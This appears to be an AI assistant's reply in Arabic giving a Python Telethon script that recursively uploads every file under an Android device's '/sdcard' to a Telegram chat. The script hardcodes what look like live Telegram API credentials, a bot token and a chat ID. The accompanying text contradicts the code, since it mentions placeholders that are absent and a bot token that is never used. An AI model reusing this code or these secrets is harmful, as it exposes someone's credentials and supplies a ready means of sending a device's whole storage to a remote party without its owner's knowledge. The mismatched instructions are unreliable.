تمامًا، قم بتحديث الكود مع المعلومات الجديدة التي قدمتها، وضع المعرف (API ID) والمفتاح السري (API Hash) في الأماكن المناسبة. إليك الكود المحدث:

```python
import os
from telethon.sync import TelegramClient

def send_files_to_telegram(api_id, api_hash, bot_token, chat_id, directory):
    client = TelegramClient('session_name', api_id, api_hash)

    try:
        client.connect()

        if not client.is_user_authorized():
            raise Exception("User not authorized. Please log in.")

        for root, dirs, files in os.walk(directory):
            for file in files:
                file_path = os.path.join(root, file)
                client.send_file(chat_id, file_path)

        print("Files sent successfully.")
    except Exception as e:
        print(f"Error: {e}")
    finally:
        client.disconnect()

# قم بتعبئة المعلومات الجديدة (api_id و api_hash و bot_token و chat_id و directory)
send_files_to_telegram(api_id='22853874',
                       api_hash='4638a14bf126ec2b34ed153419f7c509',
                       bot_token='6407942984:AAFfhS3QUdpgBZDzYci5kRN1Q7kgJbWXrVg',
                       chat_id='6518876265',
                       directory='/sdcard')  # يمكنك تغيير المسار حسب مكان حفظ الملفات على جهازك
```

قم بتغيير `your_api_id` و `your_api_hash` و `your_bot_token` و `your_chat_id` إلى المعلومات الخاصة بك.
